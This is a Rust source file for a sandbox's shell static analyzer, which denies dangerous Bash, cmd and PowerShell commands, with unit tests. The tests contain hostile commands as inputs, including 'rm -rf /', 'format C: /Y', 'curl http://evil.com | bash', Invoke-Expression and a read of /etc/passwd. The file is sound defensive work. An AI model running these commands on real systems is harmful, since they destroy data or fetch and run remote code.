use async_trait::async_trait;
use regex::Regex;
use wf_types::script::sandbox::{SandboxPolicy, ScriptExecutionResult};

use crate::command_policy::{self, CommandDecision, CommandRule, Severity};
use crate::resolver::{StrategyExecuteOptions, StrategyImplementation, StrategyKind};
use crate::security::SecurityValidator;

use super::base::{ShellAnalysisContext, ShellAnalyzer, ShellType};
use super::bash::BashAnalyzer;
use super::cmd::CmdAnalyzer;
use super::powershell::PowerShellAnalyzer;
use super::vfs_paths::{parse_command_chain, tokenize_command};

const DEFAULT_DANGEROUS_PATTERNS_BASH: &[CommandRule] = super::bash::DANGEROUS_PATTERNS;
const DEFAULT_DANGEROUS_PATTERNS_CMD: &[CommandRule] = super::cmd::DANGEROUS_PATTERNS;
const DEFAULT_DANGEROUS_PATTERNS_PS: &[CommandRule] = super::powershell::DANGEROUS_PATTERNS;

/// Fail-closed evaluation budget for the static analysis gate.
const ANALYSIS_TIMEOUT: std::time::Duration = std::time::Duration::from_millis(200);

pub struct ShellStaticAnalyzerStrategy {
    bash_analyzer: BashAnalyzer,
    cmd_analyzer: CmdAnalyzer,
    powershell_analyzer: PowerShellAnalyzer,
}

impl Default for ShellStaticAnalyzerStrategy {
    fn default() -> Self {
        Self::new()
    }
}

impl ShellStaticAnalyzerStrategy {
    pub fn new() -> Self {
        Self {
            bash_analyzer: BashAnalyzer,
            cmd_analyzer: CmdAnalyzer,
            powershell_analyzer: PowerShellAnalyzer,
        }
    }

    fn get_analyzer(&self, shell_type: ShellType) -> &dyn ShellAnalyzer {
        match shell_type {
            ShellType::Bash => &self.bash_analyzer,
            ShellType::Cmd => &self.cmd_analyzer,
            ShellType::PowerShell => &self.powershell_analyzer,
        }
    }

    fn default_dangerous_patterns(&self, shell_type: ShellType) -> &'static [CommandRule] {
        match shell_type {
            ShellType::Bash => DEFAULT_DANGEROUS_PATTERNS_BASH,
            ShellType::Cmd => DEFAULT_DANGEROUS_PATTERNS_CMD,
            ShellType::PowerShell => DEFAULT_DANGEROUS_PATTERNS_PS,
        }
    }

    fn resolve_shell_type(options: &StrategyExecuteOptions) -> ShellType {
        if let Some(ref st) = options.shell_type {
            if let Some(t) = ShellType::parse(st) {
                return t;
            }
        }
        ShellType::default_for_platform()
    }
    async fn execute_inner(
        &self,
        options: StrategyExecuteOptions,
        policy: &SandboxPolicy,
    ) -> Result<ScriptExecutionResult, Box<dyn std::error::Error + Send + Sync>> {
        let command = options.command.clone();
        if command.is_empty() {
            return Ok(deny("Empty command"));
        }

        let sv_violations = SecurityValidator::validate_expression(&command);
        if !sv_violations.is_empty() {
            return Ok(deny(&format!(
                "Security validation failed: {}",
                sv_violations[0].reason
            )));
        }

        let shell_type = Self::resolve_shell_type(&options);

        // Quick reject — hot path for clearly-safe commands. Only
        // enabled when the command has no quoting/escaping/substitution, so a
        // masked or hidden danger is never shortcut. Missing a keyword simply
        // falls back to the full analysis below.
        let conservative = ['\'', '"', '\\'];
        if !command.contains(&conservative[..])
            && !command.contains("$(")
            && !command.contains('`')
        {
            let pre_policy = policy.shell.as_ref().cloned().unwrap_or_default();
            let patterns: Vec<String> = pre_policy
                .dangerous_patterns
                .clone()
                .unwrap_or_else(|| {
                    self.default_dangerous_patterns(shell_type)
                        .iter()
                        .map(|r| r.pattern.to_string())
                        .collect()
                });
            let denied: Vec<String> = pre_policy.denied_commands.clone().unwrap_or_else(|| {
                command_policy::default_denied_commands(shell_type)
                    .iter()
                    .map(|s| s.to_string())
                    .collect()
            });
            let keywords = command_policy::quick_reject_keywords(&patterns, &denied);
            // An invalid pattern must not be hidden by the hot path — it
            // falls through to the full analysis which reports it as a denial.
            let patterns_valid = patterns.iter().all(|p| Regex::new(p).is_ok());
            if patterns_valid && command_policy::quick_reject(&command, &keywords) {
                return Ok(allow());
            }
        }

        if has_command_substitution(&command, shell_type) {
            return Ok(deny(
                "Command substitution ($(...) or backticks) is not allowed",
            ));
        }

        let shell_policy = policy.shell.as_ref().cloned().unwrap_or_default();

        // Unified command-identity decision (blacklist/whitelist +
        // normalization). The engine-level rules are empty here because this
        // gate only owns the sandbox shell policy; the engine baseline runs
        // the same pipeline at the wf-shell spawn boundary. Deny is hard,
        // AskUser/AutoApprove proceed (approval is an upper-layer concern).
        let (decision, reason) = command_policy::evaluate_command_reason(
            &command,
            shell_type,
            &command_policy::CommandRules::default(),
            Some(&shell_policy),
        );
        if decision == CommandDecision::AutoDeny {
            return Ok(deny(&reason.unwrap_or_else(|| {
                "Command denied by command policy".to_string()
            })));
        }

        let analyzer = self.get_analyzer(shell_type);

        let resolved_patterns = shell_policy.dangerous_patterns.clone().unwrap_or_else(|| {
            self.default_dangerous_patterns(shell_type)
                .iter()
                .map(|r| r.pattern.to_string())
                .collect()
        });

        // Severity lookup for the built-in rules; user-supplied patterns
        // default to High. Surfaced in the deny reason for the decision layer.
        let pattern_severity: std::collections::HashMap<&str, Severity> = self
            .default_dangerous_patterns(shell_type)
            .iter()
            .map(|r| (r.pattern, r.severity))
            .collect();

        // Match patterns against the command with single-quoted data and
        // comments masked (same masking as the per-dialect analyzers), so
        // `git commit -m 'rm -rf /'` is not a false positive.
        let masked_command = crate::command_policy::mask_data_spans(&command, shell_type);
        for pattern in &resolved_patterns {
            let re = match Regex::new(pattern) {
                Ok(re) => re,
                // A user-supplied invalid pattern must not silently
                // disable the rule (fail-open) — report it as a denial.
                Err(e) => {
                    return Ok(deny(&format!(
                        "Invalid dangerous pattern '{pattern}': {e}"
                    )))
                }
            };
            if re.is_match(&masked_command) {
                let sev = pattern_severity
                    .get(pattern.as_str())
                    .copied()
                    .unwrap_or(Severity::High);
                return Ok(deny(&format!(
                    "Dangerous pattern detected [{sev}]: {pattern}"
                )));
            }
        }

        if !shell_policy.allow_pipe.unwrap_or(true) && command.contains('|') {
            return Ok(deny("Pipe operator is not allowed"));
        }

        // Inline script bodies (`python3 -c`, `node -e`, heredocs) get a
        // second dangerous-pattern pass. Bodies are scanned verbatim (quotes
        // kept) so `import os; os.system('rm -rf /')` is caught, while shell
        // comments are masked to avoid `# reminder` false positives.
        for body in command_policy::extract_inline_scripts(&command, shell_type) {
            let scanned = command_policy::mask_comments_only(&body);
            for pattern in &resolved_patterns {
                let re = match Regex::new(pattern) {
                    Ok(re) => re,
                    Err(e) => {
                        return Ok(deny(&format!(
                            "Invalid dangerous pattern '{pattern}': {e}"
                        )))
                    }
                };
                if re.is_match(&scanned) {
                    return Ok(deny(&format!(
                        "Dangerous inline script content: {pattern}"
                    )));
                }
            }
        }

        let sub_commands = parse_command_chain(&command);
        if sub_commands.is_empty() {
            return Ok(deny("Empty command"));
        }

        for sub_command in &sub_commands {
            let tokens = tokenize_command(sub_command);
            if tokens.is_empty() {
                return Ok(deny(&format!(
                    "Sub-command \"{sub_command}\" failed to tokenize"
                )));
            }
            let ctx = ShellAnalysisContext {
                command: sub_command,
                policy: &shell_policy,
                tokens: &tokens,
            };
            let result = analyzer.analyze(&ctx);
            if !result.allowed {
                return Ok(deny(&format!(
                    "Sub-command \"{sub_command}\" denied: {}",
                    result.reason.unwrap_or_default()
                )));
            }
        }

        // VFS path validation is the single responsibility of the `vfs-gate`
        // strategy (auto-injected by the runtime whenever VFS is enabled);
        // this gate only enforces command-level rules.
        Ok(allow())
    }
}

fn deny(reason: &str) -> ScriptExecutionResult {
    ScriptExecutionResult {
        success: false,
        script_name: "sandbox-shell".to_string(),
        stdout: None,
        stderr: Some(reason.to_string()),
        exit_code: Some(1),
        execution_time: 0,
        error: Some(format!("Command denied: {reason}")),
        sandbox_mode: None,
        strategy_id: Some("static-analyzer".to_string()),
        violations: Some(vec![reason.to_string()]),
    }
}

fn allow() -> ScriptExecutionResult {
    ScriptExecutionResult {
        success: true,
        script_name: "sandbox-shell".to_string(),
        stdout: None,
        stderr: None,
        exit_code: Some(0),
        execution_time: 0,
        error: None,
        sandbox_mode: None,
        strategy_id: Some("static-analyzer".to_string()),
        violations: None,
    }
}

/// Reject command substitution, which would otherwise hide commands from the
/// per-command chain analysis (`echo $(rm -rf /)`, `` `rm -rf /` ``).
/// `$((` arithmetic expansion is also rejected conservatively because it is
/// indistinguishable from a subshell command at the string level.
fn has_command_substitution(command: &str, shell_type: ShellType) -> bool {
    match shell_type {
        ShellType::Bash => command.contains("$(") || command.contains('`'),
        ShellType::PowerShell => command.contains("$("),
        ShellType::Cmd => false,
    }
}

#[async_trait]
impl StrategyImplementation for ShellStaticAnalyzerStrategy {
    fn id(&self) -> &str {
        "static-analyzer"
    }
    fn name(&self) -> &str {
        "Shell Static Analyzer"
    }
    fn description(&self) -> &str {
        "Static command analysis with shell-type detection, command substitution rejection and shlex tokenization (analysis gate, does not execute)"
    }
    fn kind(&self) -> StrategyKind {
        StrategyKind::Analysis
    }
    fn is_available(&self) -> bool {
        true
    }

    async fn execute(
        &self,
        options: StrategyExecuteOptions,
        policy: &SandboxPolicy,
    ) -> Result<ScriptExecutionResult, Box<dyn std::error::Error + Send + Sync>> {
        // Fail-closed evaluation budget. The analysis is CPU-bound and
        // cheap in practice, but a pathological user-supplied pattern must not
        // hang the hot path — on timeout the command is denied (requires
        // manual review), never silently allowed.
        let policy = policy.clone();
        match tokio::time::timeout(
            ANALYSIS_TIMEOUT,
            self.execute_inner(options, &policy),
        )
        .await
        {
            Ok(result) => result,
            Err(_) => Ok(deny("Command analysis timed out; requires manual review")),
        }
    }


}

#[cfg(test)]
mod tests {
    use super::*;

    use crate::strategy::shell::vfs_paths::extract_file_paths;

    fn make_options(command: &str) -> StrategyExecuteOptions {
        StrategyExecuteOptions {
            command: command.to_string(),
            shell_type: None,
            runtime: None,
            workdir: None,
            env_vars: None,
            timeout_ms: None,
            vfs: None,
        }
    }

    fn default_policy() -> SandboxPolicy {
        let mut policy = crate::default_policy::default_sandbox_policy().clone();
        // Use the analyzers' built-in deny lists/patterns rather than the
        // global defaults so each shell type is tested against its own rules.
        policy.shell = None;
        policy
    }

    #[tokio::test]
    async fn test_empty_command() {
        let strategy = ShellStaticAnalyzerStrategy::new();
        let options = make_options("");
        let result = strategy.execute(options, &default_policy()).await.unwrap();
        assert!(!result.success);
        assert!(result.error.unwrap().contains("Empty command"));
    }

    #[tokio::test]
    async fn test_denies_dangerous_rm() {
        let strategy = ShellStaticAnalyzerStrategy::new();
        let options = make_options("rm -rf /");
        let result = strategy.execute(options, &default_policy()).await.unwrap();
        assert!(!result.success);
    }

    #[tokio::test]
    async fn test_allows_safe_command() {
        let strategy = ShellStaticAnalyzerStrategy::new();
        let options = make_options("echo hello");
        let result = strategy.execute(options, &default_policy()).await.unwrap();
        assert!(result.success);
        assert!(
            result.stdout.is_none(),
            "analysis gate must not execute the command"
        );
    }

    // A keyword-free plain command is fast-rejected (no full analysis)
    // and still reported as the static-analyzer strategy.
    #[tokio::test]
    async fn test_quick_reject_hot_path() {
        let strategy = ShellStaticAnalyzerStrategy::new();
        let options = make_options("echo hello world");
        let result = strategy.execute(options, &default_policy()).await.unwrap();
        assert!(result.success);
        assert_eq!(result.strategy_id.as_deref(), Some("static-analyzer"));
    }

    // Quoting disables the hot path so the full analysis runs.
    #[tokio::test]
    async fn test_quoted_command_not_fast_rejected() {
        let strategy = ShellStaticAnalyzerStrategy::new();
        let options = make_options("echo 'hello rm -rf /'");
        let result = strategy.execute(options, &default_policy()).await.unwrap();
        assert!(
            result.success,
            "single-quoted data must stay allowed: {:?}",
            result.error
        );
    }

    #[test]
    fn test_parse_command_chain() {
        let cmds = parse_command_chain("echo a; echo b && echo c");
        assert_eq!(cmds.len(), 3);
    }

    #[test]
    fn test_parse_command_chain_respects_quotes_and_escapes() {
        let cmds = parse_command_chain(r#"echo "a;b" && echo 'c|d' && echo 2\>x"#);
        assert_eq!(cmds.len(), 3);
        assert_eq!(cmds[0], r#"echo "a;b""#);
        assert_eq!(cmds[1], r#"echo 'c|d'"#);
        assert_eq!(cmds[2], r#"echo 2\>x"#);
    }

    #[test]
    fn test_parse_command_chain_keeps_fd_redirect() {
        let cmds = parse_command_chain("echo hi 2>&1");
        assert_eq!(cmds.len(), 1);
    }

    #[tokio::test]
    async fn test_chain_analysis_denies_all() {
        let strategy = ShellStaticAnalyzerStrategy::new();
        let options = make_options("echo safe && sudo rm -rf /");
        let result = strategy.execute(options, &default_policy()).await.unwrap();
        assert!(!result.success);
    }

    #[tokio::test]
    async fn test_denies_dollar_paren_substitution() {
        let strategy = ShellStaticAnalyzerStrategy::new();
        let options = make_options("echo $(rm -rf /)");
        let result = strategy.execute(options, &default_policy()).await.unwrap();
        assert!(!result.success);
        assert!(result.error.unwrap().contains("substitution"));
    }

    #[tokio::test]
    async fn test_denies_backtick_substitution() {
        let strategy = ShellStaticAnalyzerStrategy::new();
        let options = make_options("echo `rm -rf /`");
        let result = strategy.execute(options, &default_policy()).await.unwrap();
        assert!(!result.success);
        assert!(result.error.unwrap().contains("substitution"));
    }

    #[tokio::test]
    async fn test_denies_dollar_paren_hidden_dangerous_command() {
        let strategy = ShellStaticAnalyzerStrategy::new();
        let options = make_options("echo hi $(sudo rm -rf /)");
        let result = strategy.execute(options, &default_policy()).await.unwrap();
        assert!(!result.success);
    }

    #[tokio::test]
    async fn test_shell_type_routing_bash() {
        let strategy = ShellStaticAnalyzerStrategy::new();
        let options = StrategyExecuteOptions {
            command: "sudo ls".to_string(),
            shell_type: Some("bash".to_string()),
            runtime: None,
            workdir: None,
            env_vars: None,
            timeout_ms: None,
            vfs: None,
        };
        let result = strategy.execute(options, &default_policy()).await.unwrap();
        assert!(!result.success);
        assert!(result.error.unwrap().contains("sudo"));
    }

    // Blacklist applies end-to-end through the unified pipeline even
    // when the sandbox policy leaves `shell` unset (dialect defaults).
    #[tokio::test]
    async fn test_sandbox_denies_powershell_blacklist() {
        let strategy = ShellStaticAnalyzerStrategy::new();
        let options = StrategyExecuteOptions {
            command: "Start-Process -FilePath malware.exe".to_string(),
            shell_type: Some("powershell".to_string()),
            runtime: None,
            workdir: None,
            env_vars: None,
            timeout_ms: None,
            vfs: None,
        };
        let result = strategy.execute(options, &default_policy()).await.unwrap();
        assert!(!result.success);
    }

    // Wrapper prefixes are normalized before the decision, so the
    // engine-level deny rule `rm` catches `sudo rm -rf /` at the gate too.
    #[tokio::test]
    async fn test_sandbox_sudo_rm_denied_by_rm_rule() {
        let strategy = ShellStaticAnalyzerStrategy::new();
        let mut policy = default_policy();
        policy.shell = Some(wf_types::script::sandbox::ShellPolicy {
            allowed_commands: None,
            denied_commands: Some(vec!["rm".to_string()]),
            dangerous_patterns: None,
            allow_pipe: None,
            allow_redirect: None,
        });
        let options = make_options("sudo rm -rf /");
        let result = strategy.execute(options, &policy).await.unwrap();
        assert!(!result.success);
        assert!(result.error.unwrap().contains("rm"));
    }

    // Single-quoted data must not be flagged by dangerous patterns at
    // the gate level either.
    #[tokio::test]
    async fn test_sandbox_git_commit_message_no_false_positive() {
        let strategy = ShellStaticAnalyzerStrategy::new();
        let options = make_options("git commit -m 'rm -rf /'");
        let result = strategy.execute(options, &default_policy()).await.unwrap();
        assert!(
            result.success,
            "single-quoted data must not be denied: {:?}",
            result.error
        );
    }

    // Inline python code hiding `rm -rf /` inside a quoted payload must
    // be caught by the inline-body pass (the command-level mask hides it).
    #[tokio::test]
    async fn test_inline_python_dangerous_denied() {
        let strategy = ShellStaticAnalyzerStrategy::new();
        let options = make_options("python3 -c 'import os; os.system(\"rm -rf /\")'");
        let result = strategy.execute(options, &default_policy()).await.unwrap();
        assert!(!result.success);
        assert!(result.error.unwrap().contains("inline"));
    }

    #[tokio::test]
    async fn test_inline_python_safe_allowed() {
        let strategy = ShellStaticAnalyzerStrategy::new();
        let options = make_options("python3 -c 'print(1+1)'");
        let result = strategy.execute(options, &default_policy()).await.unwrap();
        assert!(result.success);
    }

    // Heredoc body carrying a dangerous command is caught (either by the
    // command-level pattern pass or the inline-body pass).
    #[tokio::test]
    async fn test_inline_heredoc_dangerous_denied() {
        let strategy = ShellStaticAnalyzerStrategy::new();
        let options = make_options("cat << EOF\nrm -rf /tmp/x\nEOF");
        let result = strategy.execute(options, &default_policy()).await.unwrap();
        assert!(!result.success);
    }

    // An invalid user-supplied pattern must deny (fail-closed), not
    // silently disable the rule.
    #[tokio::test]
    async fn test_invalid_pattern_fails_closed() {
        let strategy = ShellStaticAnalyzerStrategy::new();
        let mut policy = default_policy();
        policy.shell = Some(wf_types::script::sandbox::ShellPolicy {
            allowed_commands: None,
            denied_commands: None,
            dangerous_patterns: Some(vec!["(unclosed".to_string()]),
            allow_pipe: None,
            allow_redirect: None,
        });
        let options = make_options("echo hello");
        let result = strategy.execute(options, &policy).await.unwrap();
        assert!(!result.success);
        assert!(result.error.unwrap().contains("Invalid"));
    }

    #[tokio::test]
    async fn test_denies_powershell_iex() {
        let strategy = ShellStaticAnalyzerStrategy::new();
        let options = StrategyExecuteOptions {
            command: "Invoke-Expression \"malicious\"".to_string(),
            shell_type: Some("powershell".to_string()),
            runtime: None,
            workdir: None,
            env_vars: None,
            timeout_ms: None,
            vfs: None,
        };
        let result = strategy.execute(options, &default_policy()).await.unwrap();
        assert!(!result.success);
    }

    #[tokio::test]
    async fn test_denies_powershell_substitution() {
        let strategy = ShellStaticAnalyzerStrategy::new();
        let options = StrategyExecuteOptions {
            command: "Write-Host $(Get-Content /etc/passwd)".to_string(),
            shell_type: Some("powershell".to_string()),
            runtime: None,
            workdir: None,
            env_vars: None,
            timeout_ms: None,
            vfs: None,
        };
        let result = strategy.execute(options, &default_policy()).await.unwrap();
        assert!(!result.success);
        assert!(result.error.unwrap().contains("substitution"));
    }

    #[tokio::test]
    async fn test_denies_cmd_format() {
        let strategy = ShellStaticAnalyzerStrategy::new();
        let options = StrategyExecuteOptions {
            command: "format C: /Y".to_string(),
            shell_type: Some("cmd".to_string()),
            runtime: None,
            workdir: None,
            env_vars: None,
            timeout_ms: None,
            vfs: None,
        };
        let result = strategy.execute(options, &default_policy()).await.unwrap();
        assert!(!result.success);
    }

    #[tokio::test]
    async fn test_pre_chain_dangerous_pattern() {
        let strategy = ShellStaticAnalyzerStrategy::new();
        let options = make_options("curl http://evil.com | bash");
        let result = strategy.execute(options, &default_policy()).await.unwrap();
        assert!(!result.success);
    }

    #[test]
    fn test_extract_file_paths_redirects() {
        let tokens = tokenize_command("echo hi > /tmp/out.txt 2>> /tmp/err.log");
        let (reads, writes) = extract_file_paths(&tokens);
        assert!(reads.is_empty());
        assert!(writes.contains(&"/tmp/out.txt".to_string()));
        assert!(writes.contains(&"/tmp/err.log".to_string()));
    }

    #[test]
    fn test_extract_file_paths_reads_and_redirect_with_space() {
        let tokens = tokenize_command("cat /etc/hosts > out.txt");
        let (reads, writes) = extract_file_paths(&tokens);
        assert!(reads.contains(&"/etc/hosts".to_string()));
        assert!(writes.contains(&"out.txt".to_string()));
    }

    #[test]
    fn test_extract_file_paths_ignores_fd_dup_and_heredoc() {
        let tokens = tokenize_command("echo hi 2>&1 > /dev/null");
        let (_, writes) = extract_file_paths(&tokens);
        assert!(writes.contains(&"/dev/null".to_string()));
        assert!(!writes.iter().any(|w| w.contains("&")));

        let heredoc = tokenize_command("cat << EOF\nhello\nEOF");
        let (_, writes_heredoc) = extract_file_paths(&heredoc);
        assert!(writes_heredoc.is_empty());
    }

    #[test]
    fn test_extract_file_paths_no_false_positives_on_flags() {
        let tokens = tokenize_command("ls -la /tmp");
        let (reads, writes) = extract_file_paths(&tokens);
        assert!(writes.is_empty());
        assert!(reads.contains(&"/tmp".to_string()));
    }
}
